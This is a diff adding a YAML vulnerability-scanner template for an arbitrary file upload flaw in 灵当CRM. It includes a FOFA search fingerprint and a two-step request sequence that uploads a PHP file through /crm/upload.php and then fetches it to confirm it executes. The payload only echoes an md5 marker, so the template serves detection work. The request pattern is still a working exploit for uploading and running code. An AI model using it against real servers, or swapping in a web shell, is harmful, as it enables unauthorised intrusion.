@@ -1,0 +1,39 @@
+id: poc-yaml-51mis-crm-upload-anyfile-upload
+info:
+  name: 灵当CRM upload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 灵当CRM
+  fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php"
+    && body="ldcrm.base.js")
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+  dt1: datetime("2006")
+  dt2: datetime("01")
+  dt3: datetime("02")
+requests:
+- method: POST
+  path: /crm/upload.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----234561
+  data: '------234561
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php echo md5({{.t1}});?>
+
+    ------234561--'
+  expression: 'status_code == 200 &&
+
+    contains(body,"import url")
+
+    '
+- method: GET
+  path: /crm/recordData/{{.dt1}}{{.dt2}}{{.dt3}}/{{.t1}}.php
+  expression: status_code == 200 && body == t2
+transport: http
